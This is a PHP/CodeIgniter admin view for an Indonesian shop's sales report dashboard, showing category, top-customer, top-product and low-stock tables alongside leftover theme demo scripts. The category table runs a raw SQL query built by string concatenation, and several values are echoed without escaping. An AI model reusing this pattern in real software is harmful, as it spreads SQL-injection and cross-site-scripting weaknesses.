

<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:39:23 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->

    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url();?>assets/images/favicon.png">
    <?php if($action == 'add') {?>
    <title>Add Laporan</title>
    <?php }elseif($action == 'import'){?>
    <title>Import Laporan</title>
    <?php }elseif($action == 'edit'){?>
    <title>Edit Laporan</title>
    <?php }else{?>
    <title>Manage Laporan</title>
    <?php } ?>


    <!-- This page CSS -->
    <!-- chartist CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/morrisjs/morris.css" rel="stylesheet">
    <!--Toaster Popup message CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/toast-master/css/jquery.toast.css" rel="stylesheet">
    <!--c3 plugins CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/c3-master/c3.min.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url();?>assets/dist/css/style.min.css" rel="stylesheet">
    <!-- Dashboard 1 Page CSS -->
    <link href="<?php echo base_url();?>assets/dist/css/pages/dashboard1.css" rel="stylesheet">
    <!-- Pagu Upload -->
    <link rel="stylesheet" href="<?php echo base_url();?>assets/node_modules/dropify/dist/css/dropify.min.css">
    <!--alerts CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/sweetalert/sweetalert.css" rel="stylesheet" type="text/css">

    <!-- page css -->
    <!-- page css -->
    <link href="<?php echo base_url();?>assets/dist/css/pages/tab-page.css" rel="stylesheet">

    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/select2/dist/css/select2.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/switchery/dist/switchery.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-select/bootstrap-select.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/multiselect/css/multi-select.css" rel="stylesheet" type="text/css" />

     <link href="<?php echo base_url();?>assets/node_modules/bootstrap-material-datetimepicker/css/bootstrap-material-datetimepicker.css" rel="stylesheet">
 <!-- Daterange picker plugins css -->
    <!-- Page plugins css -->
    <link href="<?php echo base_url(); ?>assets/node_modules/bootstrap-material-datetimepicker/css/bootstrap-material-datetimepicker.css" rel="stylesheet">

    <link href="<?php echo base_url(); ?>assets/node_modules/clockpicker/dist/jquery-clockpicker.min.css" rel="stylesheet">
    <!-- Color picker plugins css -->
    <link href="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/css/asColorPicker.css" rel="stylesheet">
    <!-- Date picker plugins css -->
    <link href="<?php echo base_url(); ?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <!-- Daterange picker plugins css -->
    <link href="<?php echo base_url(); ?>assets/node_modules/timepicker/bootstrap-timepicker.min.css" rel="stylesheet">
    <link href="<?php echo base_url(); ?>assets/node_modules/bootstrap-daterangepicker/daterangepicker.css" rel="stylesheet">

    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/select2/dist/css/select2.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/switchery/dist/switchery.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-select/bootstrap-select.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/multiselect/css/multi-select.css" rel="stylesheet" type="text/css" />
    <!-- <link href="<?php echo base_url();?>assets/dist/css/pages/floating-label.css" rel="stylesheet"> -->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>

<![endif]-->
 <style type="text/css">
    
    .sticky-column{width: 63px;position:  sticky;background:  white;left: -2px;}
</style>
</head>

<body class="fixed-layout lock-nav skin-green-dark">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label"> GOODEVA </p>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <div id="main-wrapper">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->

        <?php $this->load->view('admin/common/topbar'); ?>
        
        <!-- ============================================================== -->
        <!-- End Topbar header -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        
        <?php $this->load->view('admin/common/sidebar'); ?>

        <!-- ============================================================== -->
        <!-- End Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Page wrapper  -->
        <!-- ============================================================== -->
        <div class="page-wrapper">
            <!-- ============================================================== -->
            <!-- Container fluid  -->
            <!-- ============================================================== -->


<!-- ==================================================================================================================== -->

            <!-- ====================================================== -->
            <!--  Content -->
            <!-- ====================================================== -->
            <div class="container-fluid">
                
               
                <!-- CUSTOM SONTENT HERE !! -->
                <!-- Read data -->
                    <?php if($action == '') {?> 
                        <!-- ============================================================== -->
                        <!-- Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->
                        <div class="row page-titles">
                            <div class="col-md-5 align-self-center">
                                <h4 class="text-themecolor">laporan</h4>
                            </div>
                            <div class="col-md-7 align-self-center text-right">
                                <div class="d-flex justify-content-end align-items-center">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                                        <li class="breadcrumb-item">laporan</li>
                                        <li class="breadcrumb-item active">Manage laporan</li>
                                    </ol>
                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                </div>
                            </div>
                        </div>
                        <!-- ============================================================== -->
                        <!-- End Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->    


                      <!--   <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add laporan</button></a> -->
                        <div class="row">
                            <div class="col-md-12">
                                <div class="card">
                                    <div class="card-body">
                                        <h4 class="card-title">Manage laporan</h4>
                                        <h6 class="card-subtitle">laporan Data</h6>
                                        <hr>
                                        <div class="row">
                                            <div class="col-lg-12">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h4 class="card-title">Report Period </h4>
                                                        <h6 class="card-subtitle"> <code>Total pembelian terbanyak</code></h6>
                                                        <div class="row">
                                                            <div class="col-lg-6">
                                                            <div class="input-group">
                                                                <input type="text" class="form-control date-period"  value="" name="waktu_berakhir" id="datepicker-autoclose2" placeholder="mm/dd/yyyy">
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text"><i class="icon-calender"></i></span>
                                                                </div>
                                                            </div>
                                                            </div>
                                                            <div class="col-lg-6">
                                                            <div class="input-group">
                                                                <input type="text" class="form-control date-period"  value="<?php echo date('m/d/Y') ?>" name="waktu_berakhir" id="datepicker-autoclose3" placeholder="mm/dd/yyyy">
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text"><i class="icon-calender"></i></span>
                                                                </div>
                                                            </div>
                                                            </div>
                                                        </div>
                                                       <!--  <div class="example">
                                                            <h5 class="box-title m-t-30">Date Range Pick</h5>
                                                            <input class="form-control input-daterange-datepicker" type="text" name="daterange" value="01/01/2015 - 01/31/2015" /> 
                                                        </div> -->
                                                        <!-- <div class="example">
                                                            <h5 class="box-title m-t-30">Date Range picker</h5>
                                                            <button type="button" id="kekss"> Hais</button>
                                                            <p class="text-muted m-b-20">just add id <code></code> to create it.</p>
                                                            <div class="input-daterange input-group" id="date-range">
                                                                <input type="text" class="form-control date-period" id="start" value="2018/09/01" name="start" />
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text bg-info b-0 text-white" id="starts">TO</span>
                                                                </div>
                                                                <input type="text" class="form-control date-period" value="" name="end" />
                                                            </div>

                                                            
                                                        </div> -->
                                                      
                                                        <div class="table-responsive">
                                                            <table class="table table-bordered table-striped m-t-20 no-footer">
                                                                <thead>
                                                                    <tr>
                                                                        <th>#</th>
                                                                        <th>Status Order</th>
                                                                        <th>Jumlah </th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody id="reports">
                                                                    
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </div>
                                                    
                                                </div>
                                                
                                            </div>

                                            <div class="col-lg-12">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h4 class="card-title">Report Period </h4>
                                                        <h6 class="card-subtitle"> <code>Total pembelian terbanyak</code></h6>
                                                        <div class="row">
                                                            <div class="col-lg-6">
                                                            <div class="input-group">
                                                                <input type="text" class="form-control date-period"  value="" name="waktu_berakhir" id="datepicker-autoclose5" placeholder="mm/dd/yyyy">
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text"><i class="icon-calender"></i></span>
                                                                </div>
                                                            </div>
                                                            </div>
                                                            <div class="col-lg-6">
                                                            <div class="input-group">
                                                                <input type="text" class="form-control date-period"  value="<?php echo date('m/d/Y') ?>" name="waktu_berakhir" id="datepicker-autoclose6" placeholder="mm/dd/yyyy">
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text"><i class="icon-calender"></i></span>
                                                                </div>
                                                            </div>
                                                            </div>
                                                        </div>
                                                       <!--  <div class="example">
                                                            <h5 class="box-title m-t-30">Date Range Pick</h5>
                                                            <input class="form-control input-daterange-datepicker" type="text" name="daterange" value="01/01/2015 - 01/31/2015" /> 
                                                        </div> -->
                                                        <!-- <div class="example">
                                                            <h5 class="box-title m-t-30">Date Range picker</h5>
                                                            <button type="button" id="kekss"> Hais</button>
                                                            <p class="text-muted m-b-20">just add id <code></code> to create it.</p>
                                                            <div class="input-daterange input-group" id="date-range">
                                                                <input type="text" class="form-control date-period" id="start" value="2018/09/01" name="start" />
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text bg-info b-0 text-white" id="starts">TO</span>
                                                                </div>
                                                                <input type="text" class="form-control date-period" value="" name="end" />
                                                            </div>

                                                            
                                                        </div> -->
                                                      
                                                        <div class="table-responsive">
                                                            <table class="table table-bordered table-striped m-t-20 no-footer">
                                                                <thead>
                                                                    <tr>
                                                                        <th>#</th>
                                                                        <th>Status Order</th>
                                                                        <th>Jumlah </th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody id="">
                                                                    
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </div>
                                                    
                                                </div>
                                                
                                            </div>

                                            <div class="col-lg-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h4 class="card-title">Report Kategori </h4>
                                                        <h6 class="card-subtitle"> <code>Kategori pembelian terbanyak</code></h6>
                                                       <!--  <div class="row">
                                                            <div class="col-lg-6">
                                                            <div class="input-group">
                                                                <input type="text" class="form-control date-period"  value="" name="waktu_berakhir" id="datepicker-autoclose2" placeholder="mm/dd/yyyy">
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text"><i class="icon-calender"></i></span>
                                                                </div>
                                                            </div>
                                                            </div>
                                                            <div class="col-lg-6">
                                                            <div class="input-group">
                                                                <input type="text" class="form-control date-period"  value="<?php echo date('m/d/Y') ?>" name="waktu_berakhir" id="datepicker-autoclose3" placeholder="mm/dd/yyyy">
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text"><i class="icon-calender"></i></span>
                                                                </div>
                                                            </div>
                                                            </div>
                                                        </div> -->
                                                       <!--  <div class="example">
                                                            <h5 class="box-title m-t-30">Date Range Pick</h5>
                                                            <input class="form-control input-daterange-datepicker" type="text" name="daterange" value="01/01/2015 - 01/31/2015" /> 
                                                        </div> -->
                                                        <!-- <div class="example">
                                                            <h5 class="box-title m-t-30">Date Range picker</h5>
                                                            <button type="button" id="kekss"> Hais</button>
                                                            <p class="text-muted m-b-20">just add id <code></code> to create it.</p>
                                                            <div class="input-daterange input-group" id="date-range">
                                                                <input type="text" class="form-control date-period" id="start" value="2018/09/01" name="start" />
                                                                <div class="input-group-append">
                                                                    <span class="input-group-text bg-info b-0 text-white" id="starts">TO</span>
                                                                </div>
                                                                <input type="text" class="form-control date-period" value="" name="end" />
                                                            </div>

                                                            
                                                        </div> -->
                                                      
                                                        <div class="table-responsive">
                                                            <table class="table table-bordered table-striped m-t-20 no-footer">
                                                                <thead>
                                                                    <tr>
                                                                        <th>No</th>
                                                                        <th>Kategori</th>
                                                                        <th>Jumlah </th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody id="">
                                                                    <?php $no=1; foreach ($kategori as $laporan_kategori): ?>
                                                                        <tr>
                                                                            <td><?php echo $no++; ?></td>
                                                                            <td><?php 
                                                                            $query = $this->db->query('select * from t_kategori where id ='.$laporan_kategori->id_kategori.' ')->result();

                                                                            foreach ($query as $kat) {
                                                                                echo $kat->nama_kategori;
                                                                            }

                                                                            ?></td>
                                                                            <td><?php echo number_format($laporan_kategori->paid); ?></td>
                                                                        </tr>
                                                                        
                                                                    <?php endforeach ?>
                                                                    
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </div>
                                                    
                                                </div>
                                                
                                            </div>
                                            
                                        </div>

<!--top 10 customer-->                  
                                            <div class="row">
                                              <div class="col-lg-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h4 class="card-title">TOP 10 Customer </h4>
                                                        <h6 class="card-subtitle"> <code>Total pembelian terbanyak</code></h6>
                                                        <div class="table-responsive">
                                                            <table class="table table-hover example2">
                                                                <thead>
                                                                    <tr>
                                                                        <th>#</th>
                                                                        <th>Nama Customer</th>
                                                                        <th>Jumlah Pembelian</th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody>
                                                                    <?php $no=1;  foreach ($laporan_top as $laporan): ?>
                                                                    <tr>
                                                                        <td><?php echo $no++; ?></td>
                                                                        <td><?php
                                                                     $id = $laporan->id_customer;
                                                                     $nama=$this->Detail_order_model->top_customer_nama($id);

                                                                     echo $nama[0]->nama; ?></td>

                                                                        <td>Rp.<?php echo number_format($laporan->total); ?></td>
                                                                    </tr>
                                                                   <?php  endforeach ?>
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div> 
    <!--top product-->                                        
                                            <div class="col-lg-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h4 class="card-title">TOP Product </h4>
                                                        <h6 class="card-subtitle"> <code>Nilai transaksi Produk terbanyak</code></h6>
                                                        <div class="table-responsive ">
                                                            <table  class="table table-bordered table-striped example2">
                                                                <thead>
                                                                    <tr>
                                                                        <th>#</th>
                                                                        <th>SKU</th>
                                                                        <th>Nilai transaksi</th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody>
                                                                    <?php $no=1;  foreach ($produk as $laporan): ?>
                                                                    <tr>
                                                                        <td><?php echo $no++; ?></td>
                                                                        <td><?php echo $laporan->SKU; ?></td>
                                                                        <td>Rp.<?php echo number_format($laporan->total); ?></td>
                                                                    </tr>
                                                                   <?php  endforeach ?>
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
    <!--stock-->
                                            
<!--end-->                                   
                                        
                                        </div>

                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h4 class="card-title">Barang Re-stock </h4>
                                                        <h6 class="card-subtitle"> <code>Barang Yang perlu Re-stok <20 pcs </code></h6>
                                                        <div class="table-responsive">
                                                            <table class="table table-striped example2">
                                                                <thead>
                                                                    <tr>
                                                                        <th>NO</th>
                                                                    
                                                                        <th>SKU</th>
                                                                        <th>Stok</th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody>
                                                                    <?php $no=1;  foreach ($stok as $stock): ?>
                                                                    <tr>
                                                                        <td><?php echo $no++; ?></td>
                                                                        
                                                                        <td><?php echo $stock->sku; ?></td>
                                                                        <td><span class="text-danger text-semibold"> <?php echo $stock->stok; ?></span></td>
                                                                        

                                                                        
                                                                    </tr>
                                                                   <?php  endforeach ?>
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                        </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php } ?>
                <!-- End Read Data -->


              

                <!-- Edit Data -->
                    <?php if($action == 'edit') { ?>
                       

                    <?php } ?>
                <!-- End Edit Data -->

                <!-- Detail laporan -->
                <!-- End Detail laporan -->
                <?php if($action == 'detail') {?>
                    
                  

                    
                <?php } ?>

                    


                <!-- END CUSTOM SONTENT HERE !! -->






                <!-- ============================================================== -->
                <!-- Right sidebar -->
                <!-- ============================================================== -->
                <!-- .right-sidebar -->
                <div class="right-sidebar">
                    <div class="slimscrollright">
                        <div class="rpanel-title"> Service Panel <span><i class="ti-close right-side-toggle"></i></span> </div>
                        <div class="r-panel-body">
                            <ul id="themecolors" class="m-t-20">
                                <li><b>With Light sidebar</b></li>
                                <li><a href="javascript:void(0)" data-skin="skin-default" class="default-theme">1</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-green" class="green-theme">2</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-red" class="red-theme">3</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-blue" class="blue-theme">4</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-purple" class="purple-theme">5</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-megna" class="megna-theme">6</a></li>
                                <li class="d-block m-t-30"><b>With Dark sidebar</b></li>
                                <li><a href="javascript:void(0)" data-skin="skin-default-dark" class="default-dark-theme">7</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-green-dark" class="green-dark-theme">8</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-red-dark" class="red-dark-theme working">9</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-blue-dark" class="blue-dark-theme">10</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-purple-dark" class="purple-dark-theme">11</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-megna-dark" class="megna-dark-theme ">12</a></li>
                            </ul>
                            <ul class="m-t-20 chatonline">
                                <li><b>Chat option</b></li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/1.jpg" alt="user-img" class="img-circle"> <span>Varun Dhavan <small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/2.jpg" alt="user-img" class="img-circle"> <span>Genelia Deshmukh <small class="text-warning">Away</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/3.jpg" alt="user-img" class="img-circle"> <span>Ritesh Deshmukh <small class="text-danger">Busy</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/4.jpg" alt="user-img" class="img-circle"> <span>Arijit Sinh <small class="text-muted">Offline</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/5.jpg" alt="user-img" class="img-circle"> <span>Govinda Star <small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/6.jpg" alt="user-img" class="img-circle"> <span>John Abraham<small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/7.jpg" alt="user-img" class="img-circle"> <span>Hritik Roshan<small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/8.jpg" alt="user-img" class="img-circle"> <span>Pwandeep rajan <small class="text-success">online</small></span></a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->
                <!-- End Right sidebar -->
                <!-- ============================================================== -->
            </div>
                    <!-- ====================================================== -->
                    <!-- End Content -->
                    <!-- ====================================================== -->

<!-- ==================================================================================================================== -->



            <!-- ============================================================== -->
            <!-- End Container fluid  -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- End Page wrapper  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- footer -->
        <!-- ============================================================== -->
        <?php $this->load->view('admin/common/footer'); ?>
        <!-- ============================================================== -->
        <!-- End footer -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url();?>assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap popper Core JavaScript -->
    <script src="<?php echo base_url();?>assets/node_modules/popper/popper.min.js"></script>
    <script src="<?php echo base_url();?>assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <script src="<?php echo base_url();?>assets/dist/js/perfect-scrollbar.jquery.min.js"></script>
    <!--Wave Effects -->
    <script src="<?php echo base_url();?>assets/dist/js/waves.js"></script>
    <!--Menu sidebar -->
    <script src="<?php echo base_url();?>assets/dist/js/sidebarmenu.js"></script>
    <!--Custom JavaScript -->
    <script src="<?php echo base_url();?>assets/dist/js/custom.min.js"></script>
    <script src="<?php echo base_url();?>assets/dist/js/pages/validation.js"></script>
     <!-- Date Picker Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>
    <!-- Date range Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/timepicker/bootstrap-timepicker.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-daterangepicker/daterangepicker.js"></script>

    <script src="<?php echo base_url(); ?>assets/node_modules/switchery/dist/switchery.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/select2/dist/js/select2.full.min.js" type="text/javascript"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-select/bootstrap-select.min.js" type="text/javascript"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.js" type="text/javascript"></script>
    <script type="text/javascript" src="../assets/node_modules/multiselect/js/jquery.multi-select.js"></script>
    <script>
    jQuery(document).ready(function() {
        // Switchery
        var elems = Array.prototype.slice.call(document.querySelectorAll('.js-switch'));
        $('.js-switch').each(function() {
            new Switchery($(this)[0], $(this).data());
        });
        // For select 2
        $(".select2").select2();
        $('.selectpicker').selectpicker();
        //Bootstrap-TouchSpin
        $(".vertical-spin").TouchSpin({
            verticalbuttons: true,
            verticalupclass: 'ti-plus',
            verticaldownclass: 'ti-minus'
        });
        var vspinTrue = $(".vertical-spin").TouchSpin({
            verticalbuttons: true
        });
        if (vspinTrue) {
            $('.vertical-spin').prev('.bootstrap-touchspin-prefix').remove();
        }
        $("input[name='tch1']").TouchSpin({
            min: 0,
            max: 100,
            step: 0.1,
            decimals: 2,
            boostat: 5,
            maxboostedstep: 10,
            postfix: '%'
        });
        $("input[name='tch2']").TouchSpin({
            min: -1000000000,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            prefix: '$'
        });
        $("input[name='posisi']").TouchSpin();
        $("input[name='tch3_22']").TouchSpin({
            initval: 40
        });
        $("input[name='tch5']").TouchSpin({
            prefix: "pre",
            postfix: "post"
        });
        // For multiselect
        $('#pre-selected-options').multiSelect();
        $('#optgroup').multiSelect({
            selectableOptgroup: true
        });
        $('#public-methods').multiSelect();
        $('#select-all').click(function() {
            $('#public-methods').multiSelect('select_all');
            return false;
        });
        $('#deselect-all').click(function() {
            $('#public-methods').multiSelect('deselect_all');
            return false;
        });
        $('#refresh').on('click', function() {
            $('#public-methods').multiSelect('refresh');
            return false;
        });
        $('#add-option').on('click', function() {
            $('#public-methods').multiSelect('addOption', {
                value: 42,
                text: 'test 42',
                index: 0
            });
            return false;
        });
        $(".ajax").select2({
            ajax: {
                url: "https://api.github.com/search/repositories",
                dataType: 'json',
                delay: 250,
                data: function(params) {
                    return {
                        q: params.term, // search term
                        page: params.page
                    };
                },
                processResults: function(data, params) {
                    // parse the results into the format expected by Select2
                    // since we are using custom formatting functions we do not need to
                    // alter the remote JSON data, except to indicate that infinite
                    // scrolling can be used
                    params.page = params.page || 1;
                    return {
                        results: data.items,
                        pagination: {
                            more: (params.page * 30) < data.total_count
                        }
                    };
                },
                cache: true
            },
            escapeMarkup: function(markup) {
                return markup;
            }, // let our custom formatter work
            minimumInputLength: 1,
            // templateResult: formatRepo, // omitted for brevity, see the source of this page
            //templateSelection: formatRepoSelection // omitted for brevity, see the source of this page
        });
    });
    </script>

   

    <!-- ============================================================== -->
    <!-- This page plugins -->
    <!-- This is data table -->
    <script src="<?php echo base_url();?>assets/node_modules/datatables/jquery.dataTables.min.js"></script>
    <script>
    $(document).ready(function() {
        $('#myTable').DataTable();
        $(document).ready(function() {
            var table = $('.example2').DataTable({
                // "columnDefs": [{
                //     "visible": false,
                //     "targets": 2
                // }],

                "laporan": [
                    [0, 'desc']
                ],
                "displayLength": 25,
                "drawCallback": function(settings) {
                    // var api = this.api();
                    // var rows = api.rows({
                    //     page: 'current'
                    // }).nodes();
                    // var last = null;
                    // api.column(2, {
                    //     page: 'current'
                    // }).data().each(function(group, i) {
                    //     if (last !== group) {
                    //         $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                    //         last = group;
                    //     }
                    // });
                }
            });
            // laporan by the grouping
            // $('#example tbody').on('click', 'tr.group', function() {
            //     var currentlaporan = table.laporan()[0];
            //     if (currentlaporan[0] === 2 && currentlaporan[1] === 'asc') {
            //         table.laporan([2, 'desc']).draw();
            //     } else {
            //         table.laporan([2, 'asc']).draw();
            //     }
            // });
        });
    });
    $('#myTable').DataTable({
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    });
    </script>


    <!-- jQuery file upload -->
    <script src="<?php echo base_url();?>assets/node_modules/dropify/dist/js/dropify.min.js"></script>
    <script>
    $(document).ready(function() {
        // Basic
        $('.dropify').dropify();

        // Translated
        $('.dropify-fr').dropify({
            messages: {
                default: 'Glissez-déposez un fichier ici ou cliquez',
                replace: 'Glissez-déposez un fichier ou cliquez pour remplacer',
                remove: 'Supprimer',
                error: 'Désolé, le fichier trop volumineux'
            }
        });

        // Used events
        var drEvent = $('#input-file-events').dropify();

        drEvent.on('dropify.beforeClear', function(event, element) {
            return confirm("Do you really want to delete \"" + element.file.name + "\" ?");
        });

        drEvent.on('dropify.afterClear', function(event, element) {
            alert('File deleted');
        });

        drEvent.on('dropify.errors', function(event, element) {
            console.log('Has Errors');
        });

        var drDestroy = $('#input-file-to-destroy').dropify();
        drDestroy = drDestroy.data('dropify')
        $('#toggleDropify').on('click', function(e) {
            e.preventDefault();
            if (drDestroy.isDropified()) {
                drDestroy.destroy();
            } else {
                drDestroy.init();
            }
        })
    });
    </script>

    <script>
    ! function(window, document, $) {
        "use strict";
        $("input,select,textarea").not("[type=submit]").jqBootstrapValidation();
    }(window, document, jQuery);
    </script>

    <!-- Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/moment/moment.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-material-datetimepicker/js/bootstrap-material-datetimepicker.js"></script>
    <!-- Clock Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/clockpicker/dist/jquery-clockpicker.min.js"></script>
    <!-- Color Picker Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/libs/jquery-asColor.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/libs/jquery-asGradient.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/dist/jquery-asColorPicker.min.js"></script>
    <!-- Date Picker Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>
    <!-- Date range Plugin JavaScript -->
    <script src="<?php echo base_url(); ?>assets/node_modules/timepicker/bootstrap-timepicker.min.js"></script>
